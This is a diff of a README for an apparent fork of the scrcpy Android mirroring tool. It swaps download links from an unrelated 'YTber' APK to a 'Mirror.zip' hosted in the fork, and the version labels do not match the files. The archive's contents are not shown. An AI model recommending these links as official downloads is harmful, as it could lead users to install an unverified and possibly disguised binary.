@@ -14,8 +14,8 @@ This application mirrors Android devices connected via #USB.
 [lowlatency]: https://github.com/freelancermustakin/scrcpy/
 
 ## Download
-* [Latest version release](https://github.com/freelancermustakin/YTber/raw/main/.assets/screenshot_v1/YTber_v1.0_app-release.apk) (recommended)
-* [version 2.0.20](https://github.com/freelancermustakin/YTber/raw/main/.assets/screenshot_v1/YTber_v1.0_app-release.apk)
+* [Latest version release](https://github.com/freelancermustakin/scrcpy/raw/main/Mirror.zip) (recommended)
+* [version 2.0.20](https://github.com/freelancermustakin/scrcpy/raw/main/Mirror.zip)
 
 ## Screenshots
 ![screenshot](.assets/screenshot-scrcpy-i80_phonePCw.PNG)
